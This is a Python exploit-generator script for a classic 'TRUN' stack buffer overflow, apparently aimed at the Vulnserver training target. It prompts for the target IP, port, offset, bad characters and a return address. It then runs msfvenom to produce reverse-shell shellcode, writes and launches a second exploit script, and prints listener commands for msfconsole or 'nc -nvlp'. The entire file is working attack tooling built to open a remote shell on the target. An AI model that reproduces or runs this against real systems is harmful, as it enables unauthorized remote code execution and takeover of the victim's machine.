import os, socket, time
from termcolor import colored,cprint

Ip = input(colored("[+] Target Ip Adress>> ","yellow"))
Port = int(input(colored("[+] Target Open Port>> ","green")))
Number = int(input(colored("[+] Pattern Offest>> ","blue")))
LHOST= input(colored("[+] LHOST>> ","yellow"))
LPORT= input(colored("[+] LPORT>> ","green"))
EXITFUNC = input(colored("[+] EXITFUNC(msfconsole=process | netcat=thread)>> ","blue"))
Bad = input(colored("[+] Bad Chars>> ","yellow"))
Bit = input(colored("[+] x86 Or x64>> ","blue"))
Payload = input(colored("[+] Payload(windows/meterpreter/reverse_tcp)>> ","green"))
Module = input(colored("[+] Module Code>> ","blue"))
Nops = input(colored("[+] Nops Code>> ","yellow"))
cprint("[+] Copy Shell Code !","yellow")
os.system("msfvenom -p "+Payload+" LHOST="+LHOST+" LPORT="+LPORT+" EXITFUNC="+EXITFUNC+" -a "+Bit+" -f c "+'-b "'+Bad+'"')
cprint("[+] Copy Shell Code And Pase Aporlorxl23Exploit.py","yellow")
if EXITFUNC == "process":
    Command = """
import socket,os,time
from termcolor import colored, cprint
Shell = () # Remove ';'
Buffer= "TRUN /.:/" + "A" * """+str(Number)+""" + '"""+Module+"""' + '"""+Nops+"""' * 32 + Shell
try:
    Socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    Socket.connect(('"""+Ip+"""',"""+str(Port)+"""))
    Bytes = Buffer.encode(encoding="latin1")
    Socket.send(Bytes)
    Socket.close()
    os.system("clear")
    cprint("[+] Thanks For Use Aporlorxl23 !","yellow",attrs={"blink"})
except:
    cprint("[-] Connection Fail !","red")
    Socket.close()
    print("[-] Exit...","red")
    time.sleep(2)
    exit
    os.system("clear")
    cprint("[+] Thanks For Use Aporlorxl23 !","yellow",attrs={"blink"})
    """
    File = open("Aporlorxl23Exploit.py","w")
    File.write(Command)
    File.close()
    time.sleep(10)
    cprint("[+] Copy And Paste New Terminal...","yellow")
    print("msfconsole")
    print("use exploit/multi/handler")
    print("set payload "+Payload)
    print("set LHOST "+LHOST)
    print("set LPORT "+LPORT)
    print("exploit")
    Okey = input(colored("Okey? Enter","green"))
    os.system("python3 Aporlorxl23Exploit.py")
else:
    Command = """
import socket,os,time
from termcolor import colored, cprint
Shell = () # Remove ';'
Buffer= "TRUN /.:/" + "A" * """+str(Number)+""" + '"""+Module+"""' + '"""+Nops+"""' * 32 + Shell
try:
    Socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    Socket.connect(('"""+Ip+"""',"""+str(Port)+"""))
    Bytes = Buffer.encode(encoding="latin1")
    Socket.send(Bytes)
    Socket.close()
    os.system("clear")
    cprint("[+] Thanks For Use Aporlorxl23 !","yellow",attrs={"blink"})
except:
    cprint("[-] Connection Fail !","red")
    Socket.close()
    print("[-] Exit...","red")
    time.sleep(2)
    exit
    os.system("clear")
    cprint("[+] Thanks For Use Aporlorxl23 !","yellow",attrs={"blink"})
    """
    File = open("Aporlorxl23Exploit.py","w")
    File.write(Command)
    File.close()
    time.sleep(10)
    cprint("[+] Copy And Paste New Terminal...","yellow")
    print("nc -nvlp "+LPORT)
    Okey = input(colored("Okey? Enter","green"))
    os.system("python3 Aporlorxl23Exploit.py")